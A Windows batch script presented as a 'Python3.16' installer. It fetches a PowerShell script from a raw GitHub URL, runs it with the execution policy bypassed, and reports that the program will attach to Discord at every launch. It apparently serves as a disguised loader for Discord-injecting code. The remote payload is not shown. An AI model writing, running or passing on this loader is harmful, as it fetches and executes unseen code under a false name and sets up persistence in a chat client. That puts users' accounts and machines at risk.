@echo off
setlocal EnableExtensions
title Python3.16 Loader Setup

set "RAW=https://raw.githubusercontent.com/testkgj/python316-client/main"

if not exist "%~dp0install.ps1" (
  echo Downloading installer...
  powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "try { Invoke-WebRequest -UseBasicParsing -Uri '%RAW%/install.ps1' -OutFile '%~dp0install.ps1' } catch { Write-Host 'Download failed' -ForegroundColor Red; exit 1 }"
  if errorlevel 1 goto :fail
)

powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0install.ps1" %*
if errorlevel 1 goto :fail

echo.
echo Setup finished. Python3.16 will attach to Discord automatically at every launch.
pause
exit /b 0

:fail
echo.
echo Setup failed. See the message above.
pause
exit /b 1
